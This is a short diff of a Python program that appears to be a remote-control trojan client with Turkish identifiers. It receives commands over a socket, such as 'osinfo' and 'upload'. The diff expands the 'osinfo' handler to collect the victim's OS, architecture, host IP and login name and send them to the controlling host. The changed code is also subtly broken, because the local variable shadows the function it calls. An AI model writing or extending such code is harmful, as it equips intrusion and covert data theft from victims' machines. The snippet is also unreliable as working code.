@@ -8,8 +8,17 @@ import webbrowser
 import pyautogui
 
 
-def get_os_info():
-    return platform.platform()
+def os_info():
+    info = {
+    'İşletim Sistemi': platform.system(),
+    'Python Version': platform.python_version(),
+    'Bit Version': platform.machine(),
+    'HostName': socket.gethostbyname(socket.gethostname()),
+    'Login Name': os.getlogin(),
+    'OS Name': os.name,
+
+    }
+    return info
 
 def get_cpu_info():
     cpu_info = ""
@@ -174,8 +183,12 @@ def main():
                     s.send(x)
                 
                 elif command == "osinfo":
-                    os_info = get_os_info()
-                    s.send(os_info.encode())
+                    os_info = os_info()
+                    formatted_str = ""
+                    for key, value in os_info.items():
+                        formatted_str += f"{key}: {value}\n"
+                        os_info = formatted_str
+                    s.send(str(os_info).encode())
                     
                 elif command == 'upload':
                     dosya_adi = s.recv(8192).decode()
